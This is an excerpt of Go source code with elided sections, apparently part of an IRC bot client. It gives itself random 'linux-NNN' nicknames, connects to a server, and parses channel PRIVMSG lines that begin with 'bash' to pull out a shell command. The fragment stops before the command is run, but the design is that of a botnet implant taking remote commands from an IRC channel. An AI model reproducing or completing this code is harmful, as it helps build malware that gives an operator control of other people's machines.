...
func generateNickname() string {
	...
	return fmt.Sprintf("linux-%03d", rand.Intn(100))
}
...
func connectToServer() {
	...
	for {
		...
		if strings.Contains(line, "PRIVMSG") && strings.Contains(line, "bash") {
			parts := strings.Split(line, ":")
			if len(parts) > 2 && strings.HasPrefix(parts[2], "bash") {
				cmd := strings.TrimPrefix(parts[2], "bash ")
